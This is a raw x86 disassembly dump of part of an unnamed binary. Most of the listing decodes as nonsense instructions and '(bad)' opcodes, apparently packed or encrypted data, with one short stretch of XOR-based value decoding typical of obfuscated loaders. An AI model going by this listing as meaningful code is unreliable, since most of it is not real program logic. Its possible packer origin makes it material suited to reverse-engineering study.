  40296a:	and    ecx,DWORD PTR [ebp-0xe]
  40296d:	out    0x82,al
  40296f:	mov    ah,0x57
  402971:	push   edi
  402972:	sar    BYTE PTR [ebp+0x2eccd15d],cl
  402978:	call   0x1eed:0xcad10f71
  40297f:	repz fwait
  402981:	pop    ss
  402982:	mov    ?,WORD PTR [ecx-0x7847fe06]
  402988:	jo     0x402933
  40298a:	(bad)  
  40298b:	repnz sahf 
  40298d:	jle    0x4029a8
  40298f:	(bad)  
  402990:	jmp    0x402958
  402992:	sub    ah,BYTE PTR [edx-0x45de8f42]
  402998:	into   
  402999:	repnz adc eax,0x6e9c2e23
  40299f:	fild   DWORD PTR [ebp+0x5e1943cf]
  4029a5:	sbb    BYTE PTR [eax+0x7cc441b],bh
  4029ab:	nop    DWORD PTR [edx-0x16]
  4029af:	jno    0x402a04
  4029b1:	jge    0x4029db
  4029b3:	fcom   st(3)
  4029b5:	mov    ebp,0x435de54c
  4029ba:	pop    ss
  4029bb:	shr    DWORD PTR [esp+ecx*2],1
  4029be:	sub    eax,0x7117115b
  4029c3:	retf   0xc81e
  4029c6:	test   al,0xe7
  4029c8:	aaa    
  4029c9:	push   edi
  4029ca:	fcmovbe st,st(1)
  4029cc:	mov    ecx,0xbca753fa
  4029d1:	adc    ebp,edx
  4029d3:	loope  0x4029b3
  4029d5:	test   eax,0x4c34b710
  4029da:	mov    ds:0x3b8c8727,eax
  4029df:	sbb    bh,dl
  4029e1:	pop    edx
  4029e2:	aad    0x13
  4029e4:	cmp    al,0x6e
  4029e6:	(bad)  
  4029e7:	loope  0x402a3d
  4029e9:	pop    ebx
  4029ea:	ins    DWORD PTR es:[edi],dx
  4029eb:	test   dh,0xff
  4029ee:	stc    
  4029ef:	mov    ebp,0x55a0c911
  4029f4:	mov    cl,0xab
  4029f6:	push   0x47fbc67e
  4029fb:	mov    al,0x66
  4029fd:	mov    al,ds:0xb2c276b0
  402a02:	les    esp,FWORD PTR [eax-0x49e8d2ef]
  402a08:	mov    cl,0x3b
  402a0a:	nop
  402a0b:	gs jno 0x4029eb
  402a0e:	fimul  WORD PTR [esi-0x7bace592]
  402a14:	ret    0x1a16
  402a17:	call   0xa1f7:0xba411f70
  402a1e:	int    0x82
  402a20:	sub    edx,DWORD PTR [esi+0x7805bb92]
  402a26:	(bad)  
  402a27:	sbb    ch,BYTE PTR [edi-0x60]
  402a2a:	xchg   ecx,eax
  402a2b:	adc    eax,0xb28a7294
  402a30:	cwde   
  402a31:	mov    al,ds:0xc2afe00d
  402a36:	dec    ebp
  402a37:	dec    esi
  402a38:	push   ds
  402a39:	into   
  402a3a:	test   DWORD PTR [eax+0x56],esi
  402a3d:	xor    ch,ch
  402a3f:	xchg   ecx,eax
  402a40:	fsub   DWORD PTR [eax]
  402a42:	cs test eax,0x33c8247
  402a48:	retf   0x3b97
  402a4b:	cmp    DWORD PTR [edx],esi
  402a4d:	sub    esi,edx
  402a4f:	cdq    
  402a50:	fbstp  TBYTE PTR [ebx]
  402a52:	cld    
  402a53:	enter  0x3439,0x98
  402a57:	jno    0x4029f6
  402a59:	cmp    DWORD PTR [edx-0x69234306],esi
  402a5f:	(bad)  [ebp-0x4395ad51]
  402a65:	outs   dx,BYTE PTR ds:[esi]
  402a66:	test   DWORD PTR [edx-0x69],edi
  402a69:	mov    bl,0x80
  402a6b:	lea    esi,[edi-0x7e]
  402a6e:	test   al,0x9a
  402a70:	into   
  402a71:	int3   
  402a72:	or     BYTE PTR [eax+ebx*1],ah
  402a75:	hlt    
  402a76:	push   cs
  402a77:	cmp    ch,bl
  402a79:	les    edx,FWORD PTR [ecx+edi*1]
  402a7c:	add    BYTE PTR [ecx],bl
  402a7e:	fwait
  402a7f:	lock daa 
  402a81:	push   ss
  402a82:	mov    fs,esp
  402a84:	xchg   ebx,eax
  402a85:	jns    0x402a6d
  402a87:	push   esp
  402a88:	push   ecx
  402a89:	mov    ebp,0xc983e3f
  402a8e:	mov    bl,0x89
  402a90:	test   BYTE PTR [ebp-0x4d2a68c],0xfa
  402a97:	add    al,0xf6
  402a99:	jb     0x402af4
  402a9b:	mov    al,dh
  402a9d:	daa    
  402a9e:	(bad)  
  402a9f:	ins    DWORD PTR es:[edi],dx
  402aa0:	fsub   DWORD PTR [eax+0x5c3c092f]
  402aa6:	push   es
  402aa7:	sbb    al,0x52
  402aa9:	das    
  402aaa:	push   ecx
  402aab:	or     BYTE PTR [esi],dl
  402aad:	pop    ecx
  402aae:	adc    ebp,DWORD PTR [ebp+0x734dfc8f]
  402ab4:	mov    al,BYTE PTR [edx+0x710b2615]
  402aba:	out    0x8c,eax
  402abc:	outs   dx,DWORD PTR ds:[esi]
  402abd:	mov    edx,0xadeb828c
  402ac2:	mov    dh,BYTE PTR [ecx]
  402ac4:	jmp    DWORD PTR [eax-0x7c]
  402ac7:	jg     0x402b05
  402ac9:	out    dx,eax
  402aca:	pop    ds
  402acb:	xlat   BYTE PTR ds:[ebx]
  402acc:	outs   dx,BYTE PTR ds:[esi]
  402acd:	dec    edx
  402ace:	sbb    cl,BYTE PTR [eax]
  402ad0:	mov    fs,WORD PTR ds:0x81b4095c
  402ad6:	out    0xcb,al
  402ad8:	mov    ebp,0xd8a29694
  402add:	dec    eax
  402ade:	inc    ebx
  402adf:	and    bl,BYTE PTR [ebx-0x2f]
  402ae2:	adc    DWORD PTR [ebx+0x65],0x3d
  402ae6:	sub    ah,ch
  402ae8:	and    DWORD PTR [eax],esi
  402aea:	jecxz  0x402b29
  402aec:	dec    ebp
  402aed:	add    al,0xa
  402aef:	sub    BYTE PTR [esi],ah
  402af1:	pop    eax
  402af2:	or     al,0x13
  402af4:	xchg   DWORD PTR [ebp+ebp*8+0x2240fdca],eax
  402afb:	clc    
  402afc:	iret   
  402afd:	dec    ebp
  402afe:	sbb    ebp,DWORD PTR [ebp-0x15a60e0b]
  402b04:	icebp  
  402b05:	and    al,0xf4
  402b07:	aad    0x6d
  402b09:	mov    eax,0x90bc5af8
  402b0e:	pop    ss
  402b0f:	inc    edx
  402b10:	add    bh,BYTE PTR [esp+ebx*8]
  402b13:	mov    ds,esp
  402b15:	ins    DWORD PTR es:[edi],dx
  402b16:	mov    DWORD PTR [edx-0x5e],ebp
  402b19:	pop    ebx
  402b1a:	pusha  
  402b1b:	inc    ecx
  402b1c:	xchg   esi,eax
  402b1d:	shr    BYTE PTR [esi],1
  402b1f:	lea    ebx,[esi]
  402b21:	shr    cl,cl
  402b23:	xor    edx,esp
  402b25:	xchg   edx,eax
  402b26:	cdq    
  402b27:	out    0xfa,eax
  402b29:	bound  eax,QWORD PTR [eax+0x7b7655cd]
  402b2f:	popa   
  402b30:	test   eax,0x67e5e43e
  402b35:	push   ebx
  402b36:	adc    eax,0xbc02fe8d
  402b3b:	mov    al,ds:0xfe6478dc
  402b40:	pop    edi
  402b41:	mov    DWORD PTR es:[ebp+0x28],ebp
  402b45:	fs retf 
  402b47:	xchg   ebx,eax
  402b48:	push   eax
  402b49:	push   edx
  402b4a:	xor    ch,BYTE PTR [ebx-0x4a9a8411]
  402b50:	outs   dx,BYTE PTR ds:[esi]
  402b51:	std    
  402b52:	add    al,0x52
  402b54:	aaa    
  402b55:	popf   
  402b56:	sar    ah,1
  402b58:	and    bl,BYTE PTR [ebp+edi*2-0x6]
  402b5c:	pop    ss
  402b5d:	out    0xf4,eax
  402b5f:	imul   ecx,DWORD PTR [ebx-0x44ff8d5e],0x15ec1823
  402b69:	jo     0x402b7d
  402b6b:	pop    ss
  402b6c:	xor    ah,BYTE PTR [eax+0x1fd888f2]
  402b72:	arpl   WORD PTR [ecx+ebp*1-0x334b94d0],di
  402b79:	push   ebp
  402b7a:	ins    BYTE PTR es:[edi],dx
  402b7b:	xchg   esi,eax
  402b7c:	sbb    dh,BYTE PTR [edi]
  402b7e:	sub    DWORD PTR [esi+0x42],eax
  402b81:	adc    DWORD PTR [ebp+edx*2-0x25],ecx
  402b85:	adc    eax,0xc4068eea
  402b8a:	in     eax,0x54
  402b8c:	inc    ebp
  402b8d:	push   ds
  402b8e:	add    bh,BYTE PTR [edi-0xb]
  402b91:	and    BYTE PTR gs:[ecx+0x32],dh
  402b95:	cli    
  402b96:	je     0x402bd4
  402b98:	mov    ah,0xe3
  402b9a:	xchg   ebp,eax
  402b9b:	imul   eax,DWORD PTR gs:[ecx],0xffffffe2
  402b9f:	out    dx,eax
  402ba0:	mov    cl,0x66
  402ba2:	adc    eax,0xb16abc5c
  402ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ba8:	ror    ebp,cl
  402baa:	pop    esp
  402bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bac:	push   0x9c1dcd31
  402bb1:	adc    eax,0x33a4dcb5
  402bb6:	cld    
  402bb7:	push   cs
  402bb8:	dec    edx
  402bb9:	jle    0x402bbf
  402bbb:	xor    edx,DWORD PTR [eax-0x58]
  402bbe:	fld    QWORD PTR [eax+0x12]
  402bc1:	imul   esi,DWORD PTR [ecx+0x65],0x55
  402bc5:	xor    BYTE PTR [ecx],bh
  402bc7:	pop    ss
  402bc8:	mov    ch,0x7
  402bca:	leave  
  402bcb:	pop    eax
  402bcc:	popf   
  402bcd:	lahf   
  402bce:	jmp    0x402b61
  402bd0:	mov    bl,0xe4
  402bd2:	test   eax,0x6b96310e
  402bd7:	push   ebp
  402bd8:	push   edi
  402bd9:	sub    DWORD PTR [ebx+0x6b],0x5cbae626
  402be0:	test   BYTE PTR [esi],0x75
  402be3:	sti    
  402be4:	push   ss
  402be5:	aaa    
  402be6:	pop    ebx
  402be7:	mov    eax,0xab546d7b
  402bec:	inc    edi
  402bed:	(bad)  
  402bee:	out    0x78,al
  402bf0:	dec    ebp
  402bf1:	mov    bh,0x7e
  402bf3:	mov    ds:0x9d873ee,eax
  402bf8:	pop    esp
  402bf9:	and    DWORD PTR [ecx],esp
  402bfb:	in     eax,dx
  402bfc:	pop    edi
  402bfd:	or     ch,bl
  402bff:	shl    dl,1
  402c01:	enter  0xce9b,0xf0
  402c05:	add    al,0x2f
  402c07:	outs   dx,DWORD PTR ds:[esi]
  402c08:	sub    ebx,DWORD PTR [ebp+0x6f]
  402c0b:	sub    bh,BYTE PTR [esi]
  402c0d:	cmp    eax,0xc30520f1
  402c12:	and    BYTE PTR [ecx+edi*1],ch
  402c15:	dec    ebp
  402c16:	pushf  
  402c17:	icebp  
  402c18:	jo     0x402c66
  402c1a:	clc    
  402c1b:	loopne 0x402bee
  402c1d:	add    BYTE PTR [esi-0x55],ah
  402c20:	inc    ecx
  402c21:	inc    edi
  402c22:	mov    cs,WORD PTR [edi+edi*4+0x0]
  402c26:	and    eax,0xf1422e3e
  402c2b:	jae    0x402c06
  402c2d:	mov    DWORD PTR [ebp-0x25],ecx
  402c30:	sti    
  402c31:	sbb    ebp,ecx
  402c33:	sbb    eax,0xf55dc2ac
  402c38:	mov    ebp,0x550225e2
  402c3d:	dec    eax
  402c3e:	fiadd  WORD PTR [ebp+0x76aacc94]
  402c44:	or     BYTE PTR [edx-0x1d8d8173],ah
  402c4a:	and    eax,0xfd792195
  402c4f:	cwde   
  402c50:	push   es
  402c51:	mov    WORD PTR [edi+0x6a63cf49],ds
  402c57:	ficomp DWORD PTR [ebp+ecx*2-0x2f]
  402c5b:	shr    bh,1
  402c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c5e:	mov    ah,0xac
  402c60:	xor    DWORD PTR [ebx],esi
  402c62:	mov    edx,0xb5b8e405
  402c67:	jl     0x402c46
  402c69:	stc    
  402c6a:	sbb    al,0x4d
  402c6c:	pop    esi
  402c6d:	dec    eax
  402c6e:	je     0x402c0b
  402c70:	inc    ecx
  402c71:	fs ds add bh,ah
  402c75:	sahf   
  402c76:	or     DWORD PTR [edi],ebp
  402c78:	pop    edx
  402c79:	mov    ds:0x82659dd7,eax
  402c7e:	test   BYTE PTR [ebx+0x3a],cl
  402c81:	scas   al,BYTE PTR es:[edi]
  402c82:	rcl    eax,1
  402c84:	mov    al,ds:0xc735624d
  402c89:	push   es
  402c8a:	inc    esp
  402c8b:	push   cs
  402c8c:	or     DWORD PTR [eax],edx
  402c8e:	aam    0xf7
  402c90:	lods   eax,DWORD PTR ds:[esi]
  402c91:	pop    esi
  402c92:	lahf   
  402c93:	mov    esp,0x9e1d1653
  402c98:	fucomip st,st(6)
  402c9a:	scas   al,BYTE PTR es:[edi]
  402c9b:	cmovo  esi,DWORD PTR [edi-0x52]
  402c9f:	push   eax
  402ca0:	imul   DWORD PTR [edi+0x1f3c2ec6]
  402ca6:	ds iret 
  402ca8:	cwde   
  402ca9:	mov    al,ds:0x6c67b52f
  402cae:	loope  0x402d2c
  402cb0:	les    eax,FWORD PTR [eax+0x5d74adb9]
  402cb6:	cmp    DWORD PTR [ecx-0x406ec18e],edi
  402cbc:	int    0x4c
  402cbe:	sbb    al,0x5
  402cc0:	stos   BYTE PTR es:[edi],al
  402cc1:	add    BYTE PTR [eax],al
  402cc3:	add    BYTE PTR [eax-0x75],dl
  402cc6:	inc    ebp
  402cc7:	call   0x1d8ad57
  402ccc:	add    BYTE PTR [eax],al
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs dec ebp
  402d3f:	aam    0x77
  402d41:	mov    dh,0x98
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402d02
  402d4b:	shl    ecx,1
  402d4d:	or     DWORD PTR [ecx-0x55],ecx
  402d50:	sub    al,0xaf
  402d52:	retf   
  402d53:	mov    DWORD PTR [ebp-0x65016243],ebp
  402d59:	mov    eax,ds:0x546367fa
  402d5e:	adc    edi,DWORD PTR [edi+0x2b]
  402d61:	into   
  402d62:	fdivr  DWORD PTR [ebx-0x2c80292d]
  402d68:	int3   
  402d69:	xor    bl,BYTE PTR [ebx]
  402d6b:	fs retf 0x6241
  402d6f:	push   eax
  402d70:	pop    ds
  402d71:	ret    0xfe95
  402d74:	sbb    al,0x13
  402d76:	mov    al,ds:0xfdbb5bc5
  402d7b:	fld    TBYTE PTR ds:0x481309b7
  402d81:	cwde   
  402d82:	push   ebx
  402d83:	xor    ch,cl
  402d85:	std    
  402d86:	jle    0x402df6
  402d88:	and    dl,al
  402d8a:	sahf   
  402d8b:	lods   al,BYTE PTR ds:[esi]
  402d8c:	int3   
  402d8d:	xchg   DWORD PTR [edi-0x3e],edx
  402d90:	dec    edx
  402d91:	(bad)  
  402d92:	push   edi
  402d93:	pop    edi
  402d94:	and    DWORD PTR [ecx],eax
  402d96:	lds    esi,FWORD PTR [edx]
  402d98:	push   esp
  402d99:	push   ds
  402d9a:	and    BYTE PTR [ecx-0x67d8fdbb],ch
  402da0:	pop    edi
  402da1:	mov    ch,0xb
  402da3:	sub    al,0xba
  402da5:	dec    esp
  402da6:	call   0xb573:0xea264fda
  402dad:	mov    ah,0x3f
  402daf:	neg    DWORD PTR [edi]
  402db1:	xor    edi,DWORD PTR [ebp+0x610f3a2c]
  402db7:	iret   
  402db8:	dec    edx
  402db9:	add    ecx,esp
  402dbb:	cs mov dl,0x44
  402dbe:	mov    esi,0x18f20a44
  402dc3:	in     eax,0x78
  402dc5:	ss data16 aad 0x4
  402dc9:	das    
  402dca:	mov    al,ch
  402dcc:	frstor [eax]
  402dce:	stc    
  402dcf:	add    ah,0x92
  402dd2:	(bad)  
  402dd3:	lds    ebx,FWORD PTR [edi]
  402dd5:	loop   0x402e40
  402dd7:	adc    cl,0xc2
  402dda:	out    0xb8,al
  402ddc:	and    BYTE PTR [ebp+0x547edd81],bl
  402de2:	das    
  402de3:	in     al,dx
  402de4:	jmp    0x7851:0x6da104b6
  402deb:	sbb    DWORD PTR [ecx],edi
  402ded:	imul   edi,ebx,0xddb3016c
  402df3:	dec    eax
  402df4:	mov    eax,0x44bfa3f7
  402df9:	cmp    eax,0xc74f6a29
  402dfe:	mov    ebp,0x2c0c0c5c
  402e03:	cmp    edx,edi
  402e05:	push   eax
  402e06:	pop    ebp
  402e07:	rcl    esi,0xe3
  402e0a:	push   ds
  402e0b:	add    ch,BYTE PTR [edx-0x60bc118c]
  402e11:	mov    ecx,0xe798712c
  402e16:	mov    ds:0x548bd65e,eax
  402e1b:	stos   DWORD PTR es:[edi],eax
  402e1c:	dec    esp
  402e1d:	adc    al,dh
  402e1f:	mov    edx,0xdace7ab1
  402e24:	ret    0xb461
  402e27:	out    0x5c,eax
  402e29:	inc    edx
  402e2a:	cmp    al,0x63
  402e2c:	adc    DWORD PTR [eax+0x1143b8a4],edi
  402e32:	jbe    0x402ea3
  402e34:	jg     0x402e4c
  402e36:	lods   al,BYTE PTR ds:[esi]
  402e37:	addr16 inc esp
  402e39:	sub    BYTE PTR ds:0x40b61f7f,0xa2
  402e40:	jmp    0x402df6
  402e42:	mov    bl,0x87
  402e44:	jmp    0xcef33d6e
  402e49:	pop    edi
  402e4a:	jge    0x402de1
  402e4c:	sub    DWORD PTR [esi+0x781abb79],edx
  402e52:	sbb    dl,bh
  402e54:	call   0x3501c84
  402e59:	jns    0x402e6d
  402e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e5c:	in     eax,0x98
  402e5e:	add    BYTE PTR [ebp+0x17],dh
  402e61:	cmp    eax,DWORD PTR [esp+ecx*2]
  402e64:	sti    
  402e65:	mov    edx,ebp
  402e67:	fcomp  DWORD PTR cs:[ecx-0x587efcdd]
  402e6e:	mov    ds:0xddebb4c4,eax
  402e73:	not    DWORD PTR [ecx+0x28d21a30]
  402e79:	add    esp,ebp
  402e7b:	pusha  
  402e7c:	cdq    
  402e7d:	out    0xe7,al
  402e7f:	pop    edi
  402e80:	jl     0x402e02
  402e82:	mov    eax,ds:0xa82ef41b
  402e87:	cld    
  402e88:	sbb    al,0x95
  402e8a:	sub    eax,0x87a2934a
  402e8f:	or     bl,BYTE PTR [edx+eax*4+0x65]
  402e93:	mov    esp,0x3f6c3d8c
  402e98:	or     DWORD PTR [ecx+0x8fd5f8f],ebp
  402e9e:	or     eax,0xa800d7ae
  402ea3:	popf   
  402ea4:	xor    DWORD PTR [ebx+0x36],ebp
  402ea7:	call   0x4b4:0x966f403b
  402eae:	xor    al,BYTE PTR ds:0xd1b1e5f7
  402eb4:	retf   0x691c
  402eb7:	stos   BYTE PTR es:[edi],al
  402eb8:	iret   
  402eb9:	jae    0x402eeb
  402ebb:	xor    cl,bl
  402ebd:	jmp    0x30fc500c
  402ec2:	push   eax
  402ec3:	mov    esi,0x1cd96d60
  402ec8:	aam    0xde
  402eca:	imul   ebx,DWORD PTR [edi-0x1ebc5a99],0x9ea9734c
  402ed4:	xor    eax,0xd7e9f586
  402ed9:	mov    DWORD PTR [ebx-0x111d341d],ebx
  402edf:	cli    
  402ee0:	jb     0x402ebd
  402ee2:	(bad)  
  402ee3:	ja     0x402e91
  402ee5:	pop    ebp
  402ee6:	sub    eax,DWORD PTR [eax-0x56]
  402ee9:	mov    bh,0xe2
  402eeb:	jbe    0x402f1f
  402eed:	bnd jno 0x402f61
  402ef0:	mov    BYTE PTR [ebx-0x6f3dd50d],dh
  402ef6:	test   al,0xcb
  402ef8:	call   0x6615b23c
  402efd:	pop    edx
  402efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eff:	adc    eax,DWORD PTR [ebx-0x4ccaa938]
  402f05:	cmp    edx,esp
  402f07:	dec    eax
  402f08:	fmulp  st(7),st
  402f0a:	or     bh,BYTE PTR ds:0xdba7c1eb
  402f10:	mov    ds:0x928ecb56,al
  402f15:	push   edx
  402f16:	iret   
  402f17:	jnp    0x402f6e
  402f19:	or     eax,ebp
  402f1b:	clc    
  402f1c:	add    DWORD PTR [bx+di+0x1e],eax
  402f20:	nop
  402f21:	mov    gs,esi
  402f23:	dec    esi
  402f24:	out    0x5,al
  402f26:	cmc    
  402f27:	xchg   edi,esi
  402f29:	xlat   BYTE PTR ds:[ebx]
  402f2a:	ss xchg esp,eax
  402f2c:	fs (bad) 
  402f2f:	js     0x402faa
  402f31:	fs leave 
  402f33:	lahf   
  402f34:	xor    al,0x9f
  402f36:	pop    ds
  402f37:	test   eax,0x662f4ddb
  402f3c:	adc    dl,cl
  402f3e:	mov    bh,0xa5
  402f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f41:	add    edi,DWORD PTR [edx-0x7639a107]
  402f47:	mov    ds:0x85688aa,al
  402f4c:	out    0x2b,eax
  402f4e:	mov    bl,0x89
  402f50:	push   0xc365f0c3
  402f55:	xor    ch,BYTE PTR [edi]
  402f57:	lahf   
  402f58:	jae    0x402f65
  402f5a:	int    0x33
  402f5c:	push   0xffffffb6
  402f5e:	mov    BYTE PTR [ecx],al
  402f60:	pop    ss
  402f61:	(bad)  
  402f62:	icebp  
  402f63:	outs   dx,DWORD PTR ds:[esi]
  402f64:	sub    dh,bl
  402f66:	test   BYTE PTR [ebx],0x91
  402f69:	jl     0x402f7a
  402f6b:	(bad)  
  402f6c:	ror    DWORD PTR [edi-0x76c69361],1
  402f72:	out    dx,al
  402f73:	mov    ?,WORD PTR [ecx]
  402f75:	inc    ebx
  402f76:	jae    0x402f9a
  402f78:	popf   
  402f79:	inc    esp
  402f7a:	mov    edx,0x7a5e477d
  402f7f:	sbb    BYTE PTR [ebx+0x26],bh
  402f82:	(bad)  
  402f83:	jae    0x402f55
  402f85:	cmp    edx,DWORD PTR [esi+0x7ec88a92]
  402f8b:	jo     0x40300a
  402f8d:	test   al,0x1
  402f8f:	xor    bl,dh
  402f91:	(bad)  
  402f92:	jmp    0x402fb1
  402f94:	inc    edx
  402f95:	leave  
  402f96:	add    al,0x6c
  402f98:	pop    edi
  402f99:	cmp    ebp,DWORD PTR [edi]
  402f9b:	sub    BYTE PTR [edx],al
  402f9d:	fwait
  402f9e:	jp     0x402fd5
  402fa0:	loop   0x403006
  402fa2:	lahf   
  402fa3:	addr16 inc ebx
  402fa5:	sub    eax,DWORD PTR [esi-0x34]
  402fa8:	popa   
  402fa9:	push   ebp
  402faa:	mov    bh,0xd
  402fac:	(bad)  
  402fad:	pop    ds
  402fae:	clc    
  402faf:	(bad)  
  402fb0:	loopne 0x402f93
  402fb2:	out    0x50,eax
  402fb4:	pop    esi
  402fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fb6:	jo     0x402f5a
  402fb8:	retf   
  402fb9:	xor    eax,0xcb6ecb88
  402fbe:	aas    
  402fbf:	sub    ah,dh
  402fc1:	mov    cl,0xf
  402fc3:	sbb    DWORD PTR [edx+eax*8-0x7c263618],esp
  402fca:	cmp    dh,dl
  402fcc:	in     eax,0xa1
  402fce:	push   ss
  402fcf:	add    BYTE PTR [esi],dh
  402fd1:	out    dx,al
  402fd2:	in     al,dx
  402fd3:	in     al,dx
  402fd4:	mov    esp,0xc47df20b
  402fd9:	mov    BYTE PTR [ecx-0x62],al
  402fdc:	xor    DWORD PTR [ebp+0x36],0xc72534c1
  402fe3:	mov    gs,ebp
  402fe5:	psrlw  mm1,QWORD PTR [ecx]
  402fe8:	cdq    
  402fe9:	xlat   BYTE PTR ds:[ebx]
  402fea:	call   0xe3f937af
  402fef:	mov    edx,cs
  402ff1:	xor    esp,0x39
  402ff4:	retf   
  402ff5:	int3   
  402ff6:	mov    BYTE PTR [ebx+eiz*2],al
  402ff9:	add    ecx,DWORD PTR [ebx-0x5bf7cdc8]
  402fff:	dec    esi
  403000:	sub    BYTE PTR [eax+0x2a1d555d],0xa6
  403007:	ins    BYTE PTR es:[edi],dx
  403008:	clc    
  403009:	cmp    eax,0x162f17dd
  40300e:	or     BYTE PTR [ecx],dl
  403010:	ins    BYTE PTR es:[edi],dx
  403011:	fild   DWORD PTR [esi+0x6f9898a6]
  403017:	add    BYTE PTR [edi],cl
  403019:	mov    esp,edx
  40301b:	pusha  
  40301c:	(bad)  
  40301d:	xlat   BYTE PTR ds:[ebx]
  40301e:	pop    es
  40301f:	addr16 xchg esp,eax
  403021:	push   0xd8bb6ab4
  403026:	shl    DWORD PTR [bx+di+0x52],1
  40302a:	add    ecx,ecx
  40302c:	shl    cl,cl
  40302e:	int3   
  40302f:	ins    DWORD PTR es:[edi],dx
  403030:	retf   
  403031:	xchg   ebx,eax
  403032:	cwde   
  403033:	xchg   BYTE PTR [ebx-0x46],ch
  403036:	push   0xcbfdee68
  40303b:	dec    eax
  40303c:	jb     0x403046
  40303e:	or     ebx,DWORD PTR [eax]
  403040:	pop    es
  403041:	jmp    DWORD PTR [esi]
  403043:	mov    cl,0xf8
  403045:	dec    ecx
  403046:	fwait
  403047:	jg     0x4030c2
  403049:	lahf   
  40304a:	pop    esp
  40304b:	in     eax,dx
  40304c:	cmp    ah,BYTE PTR [ebp+0x3c]
  40304f:	mov    cl,0x7f
  403051:	add    DWORD PTR [edi*1-0x5ac8a396],ecx
  403058:	daa    
  403059:	jp     0x40308c
  40305b:	sbb    dh,cl
  40305d:	aad    0xdf
  40305f:	fmul   st,st(3)
  403061:	mov    dh,bh
  403063:	cli    
  403064:	in     al,dx
  403065:	nop
  403066:	mov    bh,0x92
  403068:	dec    edx
  403069:	fwait
  40306a:	ret    0x90c3
  40306d:	call   0xd483c315
  403072:	and    ch,BYTE PTR [ecx-0x53ea58b7]
  403078:	mov    al,0x83
  40307a:	pop    edx
  40307b:	shl    BYTE PTR [ecx-0x46],1
  40307e:	jae    0x403039
  403080:	sbb    bl,ah
  403082:	adc    BYTE PTR [edx-0x9cd63e2],bh
  403088:	lock test BYTE PTR [esi+0x19],0xec
  40308d:	jecxz  0x4030cf
  40308f:	jg     0x403018
  403091:	adc    eax,0x9945fd87
  403096:	ficomp DWORD PTR [edi+0x445d7d62]
  40309c:	int3   
  40309d:	mov    dl,0x67
  40309f:	xchg   ebp,eax
  4030a0:	cmp    al,0x56
  4030a2:	add    al,0xbc
  4030a4:	xchg   esp,eax
  4030a5:	mov    ebx,0x131b1e7c
  4030aa:	in     al,dx
  4030ab:	shl    DWORD PTR [esi-0x85e6430],1
  4030b1:	adc    edx,DWORD PTR [eax]
  4030b3:	fist   DWORD PTR [edi+0x8c6b36]
  4030b9:	into   
  4030ba:	jmp    0x403103
  4030bc:	je     0x40304b
  4030be:	adc    bh,ah
  4030c0:	mov    esi,0x6f4ee672
  4030c5:	cmp    BYTE PTR [edx],cl
  4030c7:	daa    
  4030c8:	push   0xaa1086d3
  4030cd:	in     al,dx
  4030ce:	out    dx,eax
  4030cf:	add    al,0xd0
  4030d1:	jnp    0x403123
  4030d3:	jl     0x4030ee
  4030d5:	or     eax,0x8ad0562e
  4030da:	loope  0x4030db
  4030dc:	push   es
  4030dd:	sub    bh,BYTE PTR [esi-0x7e5b108e]
  4030e3:	push   esp
  4030e4:	mov    ebx,0xb1f124e0
  4030e9:	push   ecx
  4030ea:	mov    al,ds:0x62f02cc
  4030ef:	mov    al,0x20
  4030f1:	loope  0x403147
  4030f3:	js     0x403121
  4030f5:	les    esp,FWORD PTR [ebp+0x5dc95da4]
  4030fb:	lahf   
  4030fc:	int    0xfe
  4030fe:	push   0x72
  403100:	xor    al,BYTE PTR [esi+0x7b804070]
  403106:	or     al,0x53
  403108:	jg     0x40310e
  40310a:	pop    es
  40310b:	sbb    DWORD PTR [ebp-0x68a2d482],esp
  403111:	hlt    
  403112:	es dec ecx
  403114:	retf   0xf41a
  403117:	mov    al,0x55
  403119:	stos   BYTE PTR es:[edi],al
  40311a:	mov    WORD PTR [edx],ds
  40311c:	out    dx,eax
  40311d:	xchg   esp,eax
  40311e:	(bad)  
  40311f:	stc    
  403120:	jle    0x4030d3
  403122:	xor    eax,0x26318c62
  403127:	stos   BYTE PTR es:[edi],al
  403128:	mov    ecx,0xddc85191
  40312d:	int    0x31
  40312f:	xchg   BYTE PTR [ecx-0x66],bl
  403132:	jns    0x403188
  403134:	fbld   TBYTE PTR [esi]
  403136:	(bad)  
  403138:	xor    BYTE PTR [edx+0x36],0x89
  40313c:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  403142:	clc    
